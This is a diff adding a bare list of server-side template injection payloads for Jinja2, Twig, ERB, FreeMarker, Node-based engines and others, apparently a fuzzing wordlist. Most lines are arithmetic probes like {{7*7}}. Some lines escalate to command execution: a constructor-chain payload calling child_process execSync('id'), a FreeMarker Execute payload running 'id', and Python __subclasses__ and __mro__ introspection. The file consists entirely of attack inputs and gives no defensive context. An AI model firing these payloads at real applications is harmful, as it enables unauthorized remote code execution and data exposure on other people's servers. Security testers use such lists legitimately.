@@ -1,0 +1,22 @@
+{{7*7}}
+${7*7}
+#{7*7}
+%{7*7}
+<%= 7*7 %>
+{{7*'7'}}
+${{7*7}}
+{{7*7}}${7*7}#{7*7}
+@(7*7)
+{{constructor.constructor('return 7*7')()}}
+{{''.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}
+*{7*7}
+{{config}}
+{{self.__class__.__mro__}}
+${"".getClass().forName("java.lang.Runtime")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+[#assign x=7*7]${x}
+${{7*7}}
+@(1+2)
+#{7*7}${7*7}{{7*7}}
+{% debug %}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
